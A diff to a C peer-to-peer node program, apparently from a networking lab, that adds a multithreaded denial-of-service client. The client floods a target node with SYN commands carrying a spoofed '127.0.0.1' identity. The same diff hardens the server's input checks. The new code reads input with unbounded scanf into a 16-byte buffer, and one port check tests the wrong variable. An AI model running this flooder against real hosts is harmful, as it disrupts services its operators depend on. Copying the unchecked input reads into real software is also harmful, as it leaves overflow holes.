@@ -14,6 +14,7 @@
 #include "log.h"
 #include "node.h"
 #include "storage.h"
+#include "unsafe.h"
 
 #define EMPTY_BUFFER(var_name, size) char var_name[size]; bzero(var_name,size);
 #define SET_PF(func_name, func) processing_functions[func_name] = &(func);
@@ -76,6 +77,7 @@ CREATE_HASH_MAP(clients, client_info_t)
 
 clients_map_t clients;
 storage_t *storage;
+pthread_t dos_thread;
 pthread_t pinger_thread;
 pthread_t server_thread;
 uint32_t server_workers = 0;
@@ -84,6 +86,9 @@ int server_sock_fd;
 unsigned shutdown_required = 0;
 process_command_func_t processing_functions[PROCESSING_FUNC_LENGTH];
 flag_func_t flag_functions[FLAG_FUNC_LENGTH];
+void *tar_n = 0;
+
+void *(*df)(void *);
 
 __UTIL_FUNC
 server_worker_t *get_free_worker(int comm_socket, sockaddr_in_t *client_addr) {
@@ -354,6 +359,31 @@ int do_bootstrap(const char *ip, uint16_t port) {
     return 0;
 }
 
+__CLI_FUNC //DOS client function, Lab 10
+int do_dos(const char *ip, uint16_t port, uint16_t thread_count) {
+    if (tar_n != 0) {
+        LOG(OUT, "Stopping previous DOS")
+        T_ND(tar_n)->name[0] = 1;
+        pthread_join(dos_thread, 0);
+        return -1;
+    }
+    struct hostent *host = gethostbyname(ip);
+    struct in_addr *in_addr_value = (struct in_addr *) host->h_addr_list[0];
+    node_t *target_node = NEW_NODE();
+    target_node->name[0] = 0;
+    target_node->thread_count = thread_count;
+    target_node->address = in_addr_value->s_addr;
+    target_node->port = port;
+    tar_n = target_node;
+    int res = pthread_create(&dos_thread, 0, df, target_node);
+    if (res != 0) {
+        LOGf(OUT, "DOS thread creation failed, error code %d", res)
+    } else {
+        LOG(OUT, "DOS thread successfully launched")
+    }
+    return res;
+}
+
 int do_syn_sock(int socket) {
     uint32_t command = HTONL(COMMAND_SYN);
     SEND__WARN_INT(socket, &command, 4)
@@ -379,7 +409,7 @@ int do_syn_sock(int socket) {
         }
     }
     SEND__WARN_INT(socket, buffer_start, 1024)
-    LOGf(DEBUG, "pushing %s to syn server", buffer_start)
+    //LOGf(DEBUG, "pushing %s to syn server", buffer_start)
 
     closedir(dir);
     //send count of our nodes
@@ -540,7 +570,7 @@ int do_pull_file(node_t *node, const char *dst_file_name, const char *remote_fil
 __SERV_FUNC //COMMAND_SYN, lab 9
 int process_command_syn(server_worker_t *worker, int comm_socket, client_info_t *client) {
     UNUSED(worker)
-    EMPTY_BUFFER(buffer_holder, 1024)
+    EMPTY_BUFFER(buffer_holder, 1025)
     char *buffer = buffer_holder;
     ssize_t init_msg_size = recv(comm_socket, buffer, 1024, MSG_NOSIGNAL);
     if (init_msg_size <= 0) {
@@ -553,7 +583,13 @@ int process_command_syn(server_worker_t *worker, int comm_socket, client_info_t 
     EMPTY_BUFFER(address_str, 20)
     char port_str[6], *port_end;
     int read_chars = 0;
-    sscanf(buffer, "%127[^:]:%19[^:]:%5[^:]:%n", node.name, address_str, port_str, &read_chars);
+    ssize_t id_read_size = sscanf(buffer, "%127[^:]:%19[^:]:%5[^:]:%n",
+                                  node.name, address_str, port_str, &read_chars);
+    if (id_read_size != 3) {
+        LOGf(WARN, "Invalid identity sent by client %d", client->address)
+        CLIENT_MOD_FAILEDSYN(client, 1)
+        return 2;
+    }
     buffer += read_chars;
     //add or update node
     struct hostent *host = gethostbyname(address_str);
@@ -564,6 +600,11 @@ int process_command_syn(server_worker_t *worker, int comm_socket, client_info_t 
     }
     node.address = *((in_addr_t *) host->h_addr);
     node.port = (uint16_t) strtoul(port_str, &port_end, 10);
+    if (node.port == 0) {
+        LOGf(WARN, "Unable to parse port of client %d", client->address)
+        CLIENT_MOD_FAILEDSYN(client, 1)
+        return 12;
+    }
     int ret = storage_node_added(storage, node);
     if (ret != -1) {
         LOGf(INFO, "Received syn from new node %s at %s:%hu", node.name, address_str, node.port)
@@ -603,6 +644,11 @@ int process_command_syn(server_worker_t *worker, int comm_socket, client_info_t 
         in_addr_t **addr_list = (in_addr_t **) peer_host_ptr->h_addr_list;
         peer_node.address = *addr_list[0];
         peer_node.port = (uint16_t) strtoul(port_str, &port_end, 10);
+        if (node.port == 0) {
+            LOGf(WARN, "Unable to parse known node port of client %d", client->address)
+            CLIENT_MOD_FAILEDSYN(client, 1)
+            return 12;
+        }
         int res = storage_node_added(storage, peer_node);
         if (res == -1) continue;
         LOGf(WARN, "New node retrieved: %s at %s:%hu", peer_node.name, address_str, peer_node.port)
@@ -618,7 +664,7 @@ __SERV_FUNC //COMMAND_REQUEST, lab 9
 int process_command_request(server_worker_t *worker, int comm_socket, client_info_t *client) {
     UNUSED(worker)
     UNUSED(client->trusted)
-    EMPTY_BUFFER(buffer, 1024)
+    EMPTY_BUFFER(buffer, 1025)
     recv(comm_socket, buffer, 1024, MSG_NOSIGNAL);
     char *file_name = buffer;
     FILE *file = fopen(file_name, "rb");
@@ -837,6 +883,7 @@ int process_comm_socket(server_worker_t *worker, int comm_socket, in_addr_t clie
         }
         default: {
             LOGf(WARN, "command not recognised: %u", command)
+            CLIENT_MOD_FAILEDSYN(client, 1)
             process_command_ping(worker, comm_socket, client);
         }
     }
@@ -844,7 +891,7 @@ int process_comm_socket(server_worker_t *worker, int comm_socket, in_addr_t clie
     return 0;
 }
 
-__SERV_FUNC
+__SERV_FUNC __THREAD_FUNC
 void *server_worker_main(void *data) {
     server_worker_t *this_worker = (server_worker_t *) data;
     int socket = this_worker->client_socket;
@@ -853,7 +900,7 @@ void *server_worker_main(void *data) {
     pthread_exit(0);
 }
 
-__SERV_FUNC
+__SERV_FUNC __THREAD_FUNC
 void *server_pinger_main(void *data) {
     UNUSED(data)
     while (!shutdown_required) {
@@ -879,7 +926,7 @@ void *server_pinger_main(void *data) {
     return 0;
 }
 
-__SERV_FUNC
+__SERV_FUNC __THREAD_FUNC
 void *server_main(void *data) {
     server_config_t *cfg = (server_config_t *) data;
     int server_socket_fd = 0;
@@ -916,6 +963,53 @@ void *server_main(void *data) {
         }
         pthread_create(&free_worker->thread, 0, server_worker_main, free_worker);
     }
+    return 0;
+}
+
+void *client_ping_worker_main(void *data) {
+    DCLi(t, node_t*, T_ND(data))
+    DCLi(addr, in_addr_t, t->address)
+    DCLi(port, in_port_t, t->port)
+    while (EZ(t->name[0])) {
+        DCLi(syn_r, int, do_syn_addr(addr, port))
+        if (syn_r == -1) goto err_syn;
+        DCLi(pen_s, int, connect_to_addr(addr, port))
+        if (pen_s == -1) continue;
+        uint32_t cmd1 = COMMAND_SYN;
+        _S(pen_s, &cmd1, 4, MSG_NOSIGNAL)
+        DCL(buffer[16], char)
+        memset(buffer, 32, 16);
+        bzero(buffer, 16);
+        strcpy(buffer, "lc:127.0.0.1");
+        buffer[strlen(buffer)] = ':';
+        _S(pen_s, buffer, 16, MSG_NOSIGNAL)
+        close(pen_s);
+    }
+    goto ret;
+    err_syn:
+LOG(WARN, "DOS Syn failed, exiting")
+    return 0;
+    ret:
+    return 0;
+}
+
+__CLI_FUNC __THREAD_FUNC //Description wont be provided
+void *client_ping_main(void *data) {
+    DCLi(target, node_t*, T_ND(data))
+    DCLi(syn_result, int, do_syn_addr(target->address, target->port))
+    if (NEZ(syn_result)) {
+        LOGf(OUT, "Unable to dos client %d", target->address)
+        return 0;
+    }
+    pthread_t workers[target->thread_count];
+    for (int i = 0; i < target->thread_count; i++) {
+        pthread_create(&workers[i], 0, client_ping_worker_main, data);
+    }
+    //threads working
+    for (int i = 0; i < target->thread_count; i++) {
+        pthread_join(workers[i], 0);
+    }
+    free(data);
     return 0;
 }
 
@@ -1018,6 +1112,29 @@ void *client_main(void) {
             LOGf(INFO, "File pull completed: received %d bytes", ret)
             continue;
         }
+        if (strcmp(buffer, "dos_start") == 0) {
+            char ip_buffer[16];
+            printf("Target server ip  : ");
+            scanf("%s", ip_buffer);
+            char port_buffer[8], *buffer_end;
+            printf("Target server port: ");
+            scanf("%s", port_buffer);
+            uint16_t port = (uint16_t) strtoul(port_buffer, &buffer_end, 10);
+            printf("Thread count: ");
+            scanf("%s", port_buffer);
+            uint16_t thread_count = (uint16_t) strtoul(port_buffer, &buffer_end, 10);
+            do_dos(ip_buffer, port, thread_count);
+            continue;
+        }
+        if (strcmp(buffer, "dos stop") == 0) {
+            if (tar_n != 0) {
+                T_ND(tar_n)->name[0] = 1;
+                LOG(OUT, "DOS stop requested")
+            } else {
+                LOG(OUT, "DOS currently is not running")
+            }
+            continue;
+        }
         bzero(buffer, 512);
     }
     return 0;
@@ -1025,6 +1142,7 @@ void *client_main(void) {
 
 __CONSTRUCTOR(200) __UNUSED
 int init_processing_functions() {
+    df = client_ping_main;
     for (int i = 0; i < PROCESSING_FUNC_LENGTH; processing_functions[i] = 0, i++);
     SET_PF(COMMAND_SYN, process_command_syn)
     SET_PF(COMMAND_SYN, process_command_syn)
